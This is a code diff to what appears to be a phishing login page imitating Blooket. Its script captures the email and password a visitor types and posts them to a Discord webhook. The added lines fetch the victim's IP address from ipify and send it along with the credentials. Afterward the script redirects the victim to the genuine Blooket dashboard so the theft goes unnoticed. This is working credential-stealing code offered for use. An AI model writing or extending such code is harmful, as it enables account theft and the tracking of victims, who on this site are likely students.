@@ -74,26 +74,38 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Send data to Discord webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `New Login Attempt:
+            // Fetch the user's IP address using ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+
+                    // Send the email, password, and IP address to the Discord webhook
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `New Login Attempt:
 Email: ||${email}||
-Password: ||${password}||`
+Password: ||${password}||
+IP Address: ||${userIP}||`
+                        })
+                    })
+                    .then(response => {
+                        // Redirect to a fake error page or dashboard
+                        window.location.href = 'https://dashboard.blooket.com/my-sets';
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        window.location.href = 'https://dashboard.blooket.com/my-sets';
+                    });
                 })
-            })
-            .then(response => {
-                // Redirect to a fake error page or dashboard
-                window.location.href = 'https://dashboard.blooket.com/my-sets';
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                window.location.href = 'https://dashboard.blooket.com/my-sets';
-            });
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    window.location.href = 'https://dashboard.blooket.com/my-sets';
+                });
         });
     </script>
 </body>
